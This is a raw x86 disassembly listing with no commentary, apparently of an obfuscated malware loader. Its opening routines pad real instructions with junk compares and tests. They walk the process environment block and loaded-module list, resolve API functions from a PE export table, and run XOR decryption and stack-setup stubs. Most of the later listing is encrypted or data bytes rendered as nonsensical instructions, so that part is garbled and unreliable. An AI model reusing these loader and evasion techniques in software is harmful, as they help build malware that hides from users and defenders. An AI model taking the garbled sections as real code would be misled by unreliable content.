test cl 0x2b
rdtsc
cmp ax 0x24b9
cmp ecx 0xffffff
jne sub_4697ca
test ch 0x6d
pop eax
test eax 0xe9b836b8
add al [ edi + 0x2 ]
test ah 0xfa
push eax
cmp ch 0x19
retn
sub_4698de
cmp ah 0x8f
pop ebx
cmp si 0x65ff
push 0x0
cmp cx 0x6e29
push esp
test dh 0xda
push ebx
cmp ebx 0xe9b985c4
mov edx eax
cmp cl 0xdd
call edx
test ah 0xf5
pop eax
cmp dl 0x27
cmp eax 0xc
jl r-xdata
call sub_469b4e
test di 0xe55a
mov edx 0x36
cmp edx 0xe9b9eed6
inc edx
test edx 0xe9b9f99d
inc edx
test cx 0x223
inc edx
test ah 0xa2
inc edx
test ch 0x44
inc edx
cmp ch 0xbf
inc edx
cmp ebx 0xe9ba296a
inc edx
test dl 0xe2
inc edx
test ecx 0xe9ba3b53
inc edx
test bh 0xbd
inc edx
test al 0x57
push edx
cmp ah 0xa1
mov edx 0xff0
cmp si 0x6151
add edx 0x10
cmp cx 0x698d
push edx
test dh 0xd4
push 0x55e0
cmp ebx 0xe9ba7a4e
sub edx 0xff0
cmp cl 0xa3
sub edx 0x10
test ah 0xec
push edx
cmp dl 0x74
call eax
cmp si 0xa061
jmp r-xdata
cmp si 0xb168
mov ecx esp
cmp esi 0xe9b9ba1f
sub ecx 0xffffffec
cmp edi 0xe9b9c573
mov edx ecx
cmp ax 0xcf40
sub edx 0xfffffff4
test edx 0xe9b9dc30
call sub_4699bc
push ebx
leave
mov [ esi - 0x6d ] edx
fsub [ eax - 0x339a856a ]
cli
push ss
int3
sub_4699bc
cmp esi 0xe9baa99c
pop edi
cmp edi 0xe9bab679
cmp ax 0xbf46
inc esi
test edx 0xe9baca7e
mov edx [ edi ]
test di 0xd948
xor edx esi
cmp edx 0xe9bae71e
mov ebx [ esp + 0x10 ]
test edx 0xe9baf5c4
cmp edx ebx
jne r-xdata
test cx 0x498
mov ebx 0x55e0
test ah 0xa9
test ch 0x8
sub ebx 0x4
cmp ch 0xa1
push [ edi + ebx ]
cmp esi 0xe9bb45c0
pop edx
test cl 0x92
call sub_469797
cmp bl 0xd9
or [ eax + ebx ] edx
test dh 0xa3
test ebx ebx
jne r-xdata
cmp di 0x8036
jmp eax
sub_469b4e
test bh 0x2d
push 0x30
cmp cl 0xf2
pop ebx
test ax 0xaf7c
push [ fs : ebx ]
test edi 0xe9bbb8fc
pop ebx
test bh 0xd7
mov ebx [ ebx + 0xc ]
cmp cx 0xcd0a
mov ebx [ ebx + 0x14 ]
cmp dx 0xd6bf
push ecx
test si 0xdecc
mov ebx [ ebx ]
cmp bx 0xe9d8
mov ecx [ ebx + 0x28 ]
test eax 0xe9bbf3a1
push 0x4f756
test cl 0xbe
pop eax
test edx 0xe9bc0fb1
add eax 0x3d0900
cmp ah 0x1
cmp [ ecx + 0x4 ] eax
jne r-xdata
cmp edi 0xe9bc22a9
push 0x15f74d
test dl 0xd
pop eax
test si 0x3608
add eax 0x3d0900
test al 0x4a
cmp [ ecx ] eax
jne r-xdata
cmp si 0x495c
pop ecx
test ax 0x524d
mov esi [ ebx + 0x10 ]
test edi 0xe9bc5a5a
mov edi esi
test bh 0xf
mov ebx [ esi + 0x3c ]
cmp cx 0x6bb1
add esi ebx
cmp dx 0x7751
mov ebx [ esi + 0x78 ]
test si 0x802a
mov eax edi
cmp bx 0x898d
add eax ebx
test eax 0xe9bc93f9
mov esi eax
test cl 0x3
add esi 0x28
test edx 0xe9bcaa40
lodsd [ esi ]
cmp ah 0xf9
test eax eax
je r-xdata
cmp edi 0xe9bcbd3d
add eax edi
test dl 0x6b
mov ebx [ esp + 0x8 ]
test si 0xd12b
cmp [ eax ] ebx
jne r-xdata
test al 0xa3
mov ebx [ eax + 0x4 ]
cmp si 0xe4ad
cmp ebx [ esp + 0xc ]
jne r-xdata
test ax 0xeeee
mov esi [ esp + 0x10 ]
test edi 0xe9bcf866
push 0x0
test bh 0x9f
pop ebx
cmp cx 0xc0a
push ebx
cmp dx 0x1639
push ebx
test si 0x1fe0
push ebx
cmp bx 0x2a17
push esp
test eax 0xe9bd3392
push esi
test cl 0x1b
push edx
test edx 0xe9bd4741
push ecx
cmp ah 0x9
push esp
cmp edi 0xe9bd59fa
call eax
test dl 0x2
add esp 0x1c
test si 0x74ae
retn
sub_46a434
rol [ ecx ] cl
jbe r-xdata
int3
in al dx
not [ esi + 0x93c15b5 ]
movsb [ edi ] [ esi ]
mov [ edi + 0x77569f87 ] cs
fwait
in al dx
jo r-xdata
cli
push ss
int3
call sub_4699bc
push ebx
leave
mov [ esi - 0x6d ] edx
fsub [ eax - 0x339a856a ]
cli
push ss
int3
sub_46a560
push cs
mov al [ 0x349c8596 ]
xchg esi eax
jpe r-xdata
stosd [ edi ]
cmpsb [ esi ] [ edi ]
or al 0xa0
xchg esi eax
jne r-xdata
pop edi
add edi [ esi + 0x8 ]
mov al [ 0x78202196 ]
int3
iretd
sub_46a6d6
cld
cmp ah [ ecx - 0x60 ]
cmpsb [ esi ] [ edi ]
jpe r-xdata
imul ebp [ edx - 0x6c1d9f74 ] 0x4b9ae580
leave
sub ebx edx
loopne r-xdata
enter 0x7a96 0x9
movsb [ edi ] [ esi ]
cld
jpe r-xdata
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
mov bl 0x7a
or ecx edi
pop ds
test [ 0xffffffffe07a96a1 ] 0x97ab1b7
cli
jle r-xdata
shl [ ebx ] 0x6f
jpe r-xdata
pop edi
cdq
sub cl ch
adc cl [ ecx - 0xd0519bd ]
rcr [ ecx - 0x69704e02 ] 0x1
jpe r-xdata
xchg esi eax
jpe r-xdata
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
add [ eax - 0x57730c6a ] esp
xchg edi eax
jpe r-xdata
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
jns r-xdata
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
int1
adc al 0x90
mov eax [ 0xffffffffaf097a96 ]
xor al 0xf3
fldenv [ ecx + 0x7e ]
insd
mov al [ eax - 0x69 ]
stc
int1
mov eax [ 0xffffffff8fa9ff99 ]
xchg esi eax
jpe r-xdata
adc eax 0x12af0982
fwait
cmp [ eax - 0x5b998a6a ] esp
mov dl 0x10
or [ edi + 0x3 ] bl
out dx al
or [ eax + 0x35f62e96 ] esp
sahf
jpo r-xdata
and [ edx + 0x7a ] edi
or esp [ eax + 0x70f62e96 ]
stosb [ edi ]
inc esi
mov esi 0x7a96a209
loopne r-xdata
dec eax
adc eax 0x1fa0097c
aas
inc ebp
dec ecx
imul ebx [ edi ] 0x96a12df7
jpe r-xdata
xchg esi eax
jne r-xdata
mov al [ 0xffffffffaf098215 ]
adc bh [ edi + 0x7596a039 ]
lodsb [ esi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x14f1f29c
nop
xchg esi eax
jpe r-xdata
and eax 0x2513bac9
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
mov al [ 0x13bac925 ]
and eax 0x2513bac9
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
in eax dx
xchg edx eax
xchg ebx eax
jno r-xdata
inc esi
xor eax 0x3546aa9c
pushfd
mov dl 0x75
jg r-xdata
lodsb [ esi ]
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
cdq
add al 0xc0
and ebp [ edi + 0x7a ]
jl r-xdata
stosb [ edi ]
inc esi
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
jecxz r-xdata
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xe07edb2b
jpe r-xdata
pushfd
xchg esi eax
jpe r-xdata
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
inc esi
xor eax 0x3546aa9c
pushfd
stosb [ edi ]
pop ss
sbb eax 0x43490d37
cli
jle r-xdata
jle r-xdata
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
dec eax
cmp eax 0x1fa0097c
aas
pop ecx
dec ecx
pop es
push esi
or [ eax - 0x47bb0c31 ] esp
jg r-xdata
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
sub ebx ebx
in eax 0xae
int1
inc esp
movsb [ edi ] [ esi ]
jg r-xdata
mov edx 0xbac92513
adc esp [ 0xffffffffdb2bbac9 ]
push ecx
or [ eax - 0x5a736d34 ] esp
xchg esi eax
jpe r-xdata
or al 0xa0
xchg esi eax
dec esp
and eax 0xe12096a0
xor al 0x90
jpe r-xdata
call 0x4953e0b3
inc ebx
dec esp
and [ eax - 0x2b1edf6a ] esp
xchg ebx eax
jpe r-xdata
xchg esi eax
jpe r-xdata
sub ebx edx
sub ch 0x92
xchg ebx eax
dec eax
mov edx [ esi + 0x1548537a ]
jl r-xdata
jg r-xdata
sub [ ebx ] edx
salc
or [ eax - 0x5bbb0e6a ] esp
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
and eax 0x2513bac9
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
mov edx 0xbac92513
adc esp [ 0x2513bac9 ]
leave
inc ecx
jpe r-xdata
mov al [ 0x49453f1f ]
mov al [ 0xffffffff98e12096 ]
mov al [ cs : 0xffffffffc0e12096 ]
xchg ebx eax
jpe r-xdata
jg r-xdata
sub [ ebx ] edx
bound ecx [ eax ]
jg r-xdata
sub [ ebx ] edx
jpe r-xdata
loope r-xdata
and ah [ eax - 0x7b1edf6a ]
xchg ebx eax
jpe r-xdata
and ah [ eax - 0x131edf6a ]
xchg ebx eax
jpe r-xdata
mov al [ 0xffffffffece12096 ]
mov al [ 0xffffffffa444f196 ]
fstp [ esi - 0x20 ]
xchg ebx eax
jpe r-xdata
jg r-xdata
sub [ ebx ] edx
or [ eax - 0x5bbb0e6a ] ah
jg r-xdata
sub [ ebx ] edx
outsb
or [ eax - 0x5bbb0e6a ] ah
daa
push esp
std

and ah [ eax - 0x4f1edf6a ]
xchg ebx eax
jpe r-xdata
mov al [ 0xffffffffa444f196 ]
or [ ecx ] ebp
adc esp [ edx + 0x8 ]
and ah [ eax - 0x671edf6a ]
xchg esi eax
jpe r-xdata
sub [ ebx ] edx
pop edx
or [ eax - 0x72af6c6a ] ah

sub edx [ esi + 0x7f9c4cf3 ]
mov bh 0x9
mov al [ 0xfffffffffd542796 ]

sub_46aaf7
daa
loope r-xdata
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
cmp [ edx + 0x9 ] 0x29
adc esi [ edx - 0x6695ff7 ]
int1
mov eax [ 0xffffffff8ee176e2 ]
xchg edi eax
jpe r-xdata
0x9266c04b 0x975
sar [ esi + 0x7 ] 0x1e
mov al [ 0xffffffffdd821b96 ]
jmp r-xdata
or [ ecx ] 0xffffffa2
xchg esi eax
jpe r-xdata
dec esp
clc
adc eax 0x12af0982
sbb [ eax ] 0xffffffa0
xchg esi eax
int1
dec esp
hlt
dec esp
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
jpe r-xdata
push ebx
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
int1
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xfffffffff14c7ad3 ]
xchg esi eax
and bl [ ecx + 0x48 ]
mov al [ 0xfffffffff84cf396 ]
jg r-xdata
xchg esi eax
sbb eax [ edx - 0x3fb46523 ]
xchg dx ax
jne r-xdata
and eax 0x592296a0
dec eax
r-xdata
loope r-xdata
sub_46ab38
or [ eax - 0x5ff65d81 ] esp
xchg esi eax
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
mov al [ 0xffffffffa04c7ad3 ]
sar [ edx + 0x4c ] cl
int1
dec esp
clc
adc eax 0x12af0982
sbb [ eax ] 0xffffffa0
xchg esi eax
int1
dec esp
hlt
sub_46c778
pop esp
in al 0x7d
ja r-xdata
mov al [ 0xfffffffff60b1096 ]
imul ebp [ edx - 0x43e8a180 ] 0x7a96a809
arpl [ eax - 0x5f9c8504 ] sp
rcl [ eax ] 0x9
0x8596
inc esi
cdq
jpe r-xdata
xchg esi eax
adc dh dh
pop edi
retn
clc
adc eax 0x94d40842
xchg ecx eax
push cs
0x1096
sub_46cc61
mov al [ 0x5f632a96 ]
imul ebp edi 0x7a96a0a5
push ebx
sub ecx edx
pop esi
or eax 0x4ac29566
sub [ ebp + 0x7ea00db8 ] eax
fchs
pop edi
and [ ebp + 0xe ] edx
or [ eax - 0x1f9cd66a ] ah
cmc
pop ds
jpe r-xdata
loopne r-xdata
fistp [ edi ]
iretd
jpe r-xdata
jle r-xdata
loopne r-xdata
std

imul ebp [ eax ] 0x2af2c16c
jpo r-xdata
sub_46cc8e
in al 0x3
or [ eax - 0x72 ] ecx
xchg ecx eax
neg [ edi + 0x2d ]
jpe r-xdata
jle r-xdata
mov al [ 0x48ea8596 ]
mov eax 0x7e5ff691
arpl [ ecx ] cx
mov al [ 0xffffffffa1f57f96 ]
daa
push esp
std

xchg esi eax
jpe r-xdata
or [ eax - 0x5e0a806a ] esp
jle r-xdata
test al 0x1f
mov ah 0x82
call 0x2b4ec054
fidiv [ esi - 0x80 ]
out dx al
xchg edx eax
int1
dec ecx
movsb [ edi ] [ esi ]
imul ebx [ edx - 0x64d5b7e ] 0x9255a5e1
and al 0x7a
imul eax [ ebp + 0x8f3d37c ] 0x9396923a
out 0xa0 eax
xchg esi eax
jpe r-xdata
outsb
mov [ 0xffffffffe17c93aa ] eax
adc eax 0x5f910cb9
cmp ecx [ ecx + 0x7cc29d9c ]
pop ecx
push ss
push es
add ah [ esi + edx * 4 + 0x1de1fb0f ]
outsb
add ch dl
sbb eax 0xc4a42d3e
and [ ebp + 0xe ] edx
or [ eax - 0x1f9cd66a ] ah
std

std

sub_46cdcf
push ss
or [ eax + 0x54 ] ecx
lodsd [ esi ]
neg [ edi - 0x3b ]
pop ds
jge r-xdata
daa
push esp
std

in al 0x8
rcr bl cl
adc eax 0x9296c56d
dec edi
ja r-xdata
pop ebp
leave
cmc
adc [ edx - 0x31 ] ecx
jecxz r-xdata
test [ edx - 0x3b ] esp
in al 0x14
insb
int3
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx + 0x432792a4 ]
imul eax [ ebp + 0x14c3d447 ] 0x2ce6c164
pushad
jge r-xdata
neg [ esi ]
pop edi
leave
in al 0xe
jl r-xdata
jg r-xdata
daa
push esp
std
jle r-xdata
cli
aaa
insb
int 0xf9
or [ eax - 0x60 ] dh
jle r-xdata
stc
or [ eax - 0x6dc4b76a ] esp
aam 0xda
0x7d14695f 0xfac4
sbb edi [ edx - 0x2c ]
ror [ eax ] cl
jpo r-xdata
ficomp [ edi + 0x69 ]
sub [ esp + edx * 8 - 0x26 ] ebp
vunpcklps ymm5 ymm3 [ esp + ecx * 8 - 0x5b ]
dec eax
or [ eax - 0x2c ] ecx
cdq
neg [ edi - 0x28 ]
push cs
pop ebx
in al 0x7a
loope r-xdata
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
dec esi
test esi esi
out 0xf3 eax
push cs
dec edx
aad 0xe4
or [ esi - 0x2e ] esp
sub_46cf52
in al 0x17
pushad
into
test [ esi ] 0x8fef46c
insb
shl edx 0x7a
loope r-xdata
je r-xdata
ja r-xdata
pop es
je r-xdata
jmp r-xdata
xchg edx eax
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx + 0x432792a4 ]
imul dh
test [ edi - 0x2c ] eax
xlat
jmp r-xdata
pop es
je r-xdata
shr bh cl
jpo r-xdata
pop es
je r-xdata
jmp r-xdata
aam 0x96
xchg edx eax
jb r-xdata
jg r-xdata
imul eax [ ebp + 0x14c3d447 ] 0x2ce6c164
pushad
xchg edx eax
daa
inc ebx
test [ esi ] 0x8fef46c
insb
shl edx 0x3f
jno r-xdata
adc edi [ ebx - 0x2c ]
jecxz r-xdata
jmp r-xdata
pop es
je r-xdata
pop es
imul eax [ ebp + 0x16d7d447 ] 0x1bf5cf65
jge r-xdata
jpe r-xdata
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
dec eax
cmp edx [ edx - 0x6dc4b75c ]
movsb [ edi ] [ esi ]
jle r-xdata
jpe r-xdata
in eax dx
pop es
je r-xdata
jmp r-xdata
or [ ecx + eax * 8 - 0xe ] ch
jpe r-xdata
pop ss
rcl [ ebx ] 0x7b
aam 0xe3
jmp r-xdata
fucomp st3
jmp r-xdata
jmp r-xdata
pop es
je r-xdata
sbb [ ebp - 0x37 ] edi
stc
adc al 0x9
dec eax
fwait
